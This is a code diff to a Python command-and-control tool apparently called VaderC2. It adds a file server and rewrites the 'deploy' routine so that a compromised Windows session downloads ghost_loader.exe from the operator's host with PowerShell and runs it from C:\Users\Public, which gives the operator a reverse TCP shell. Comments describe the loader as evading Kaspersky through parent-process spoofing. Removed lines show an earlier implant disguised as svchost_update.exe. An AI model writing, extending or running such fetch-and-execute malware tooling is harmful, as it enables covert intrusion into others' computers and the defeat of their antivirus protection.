@@ -341,6 +341,22 @@ class VaderC2:
 
     # ── TCP Listener ──
 
+    def _ensure_file_server(self, my_ip, port=8890):
+        if getattr(self, "_file_server_running", False):
+            return
+        from http.server import HTTPServer, SimpleHTTPRequestHandler
+        import functools
+        handler = functools.partial(SimpleHTTPRequestHandler, directory=ROOT_DIR)
+        handler.log_message = lambda *a: None
+        try:
+            srv = HTTPServer(("0.0.0.0", port), handler)
+            t = threading.Thread(target=srv.serve_forever, daemon=True)
+            t.start()
+            self._file_server_running = True
+            print(f"  {GREEN}[*] File server started: http://{my_ip}:{port}/ (serving {ROOT_DIR}){RST}")
+        except OSError:
+            self._file_server_running = True  # already bound, assume running
+
     def start_listener(self):
         self.listener_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.listener_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -824,20 +840,22 @@ class VaderC2:
                             _s.close()
                         except Exception:
                             my_ip = "192.168.1.92"
+                        # ghost_loader_v3 = CLEAN vs Kaspersky (parent spoof via explorer.exe)
+                        # vader_shell.exe is quarantined by KAV — never deploy it directly
+                        self._ensure_file_server(my_ip)
                         deploy_cmd = (
+                            f'taskkill /F /IM ghost_loader.exe 2>nul & '
                             f'taskkill /F /IM svchost_update.exe 2>nul & '
-                            f'taskkill /F /IM vader_shell.exe 2>nul & '
                             f'powershell -c "'
-                            f'Invoke-WebRequest -Uri \'http://{my_ip}:8890/agent/dist_py/svchost_update.exe\' '
-                            f'-OutFile \'C:\\Users\\Public\\svchost_update.exe\'; '
-                            f'Invoke-WebRequest -Uri \'http://{my_ip}:8890/vader_shell.exe\' '
-                            f'-OutFile \'C:\\Users\\Public\\vader_shell.exe\'; '
-                            f'Start-Process \'C:\\Users\\Public\\svchost_update.exe\'; '
-                            f'Start-Process \'C:\\Users\\Public\\vader_shell.exe\'"'
+                            f'Invoke-WebRequest -Uri \'http://{my_ip}:8890/shell/ghost_loader.exe\' '
+                            f'-OutFile \'C:\\Users\\Public\\ghost_loader.exe\'; '
+                            f'Start-Process \'C:\\Users\\Public\\ghost_loader.exe\'"'
                         )
-                        print(f"  {AMBER}[*] Deploying via {s.id[:8]} ({s.channel})...{RST}")
+                        print(f"  {AMBER}[*] Deploying ghost_loader_v3 via {s.id[:8]} ({s.channel})...{RST}")
+                        print(f"  {DIM}    Serving: http://{my_ip}:8890/shell/ghost_loader.exe{RST}")
                         if self.send_to_session(s, deploy_cmd):
-                            print(f"  {GREEN}[+] Deploy sent — Discord implant + TCP shell (C2 baked in){RST}")
+                            print(f"  {GREEN}[+] Deploy sent — ghost_loader_v3 (KAV-clean) delivering TCP shell{RST}")
+                            print(f"  {DIM}    TCP callback expected on port {self.port} in ~5-10s{RST}")
                             self.deployed_this_session = True
                         else:
                             print(f"  {RED}[!] Send failed{RST}")
@@ -1205,19 +1223,17 @@ def run_tcp_cmd(tcp_cmd_str):
         my_ip = "192.168.1.92"
 
     if cmd == "deploy":
+        self._ensure_file_server(my_ip)
         deploy_cmd = (
+            f'taskkill /F /IM ghost_loader.exe 2>nul & '
             f'taskkill /F /IM svchost_update.exe 2>nul & '
-            f'taskkill /F /IM vader_shell.exe 2>nul & '
             f'powershell -c "'
-            f'Invoke-WebRequest -Uri \'http://{my_ip}:8890/agent/dist_py/svchost_update.exe\' '
-            f'-OutFile \'C:\\Users\\Public\\svchost_update.exe\'; '
-            f'Invoke-WebRequest -Uri \'http://{my_ip}:8890/vader_shell.exe\' '
-            f'-OutFile \'C:\\Users\\Public\\vader_shell.exe\'; '
-            f'Start-Process \'C:\\Users\\Public\\svchost_update.exe\'; '
-            f'Start-Process \'C:\\Users\\Public\\vader_shell.exe\'"'
+            f'Invoke-WebRequest -Uri \'http://{my_ip}:8890/shell/ghost_loader.exe\' '
+            f'-OutFile \'C:\\Users\\Public\\ghost_loader.exe\'; '
+            f'Start-Process \'C:\\Users\\Public\\ghost_loader.exe\'"'
         )
         s.sock.sendall((deploy_cmd + "\n").encode("utf-8"))
-        print(f"  {GREEN}[+] Deploy sent — Discord implant + TCP shell (C2 baked in){RST}")
+        print(f"  {GREEN}[+] Deploy sent — ghost_loader_v3 (KAV-clean) delivering TCP shell{RST}")
 
     elif cmd == "screenshot":
         recv_port = 8891
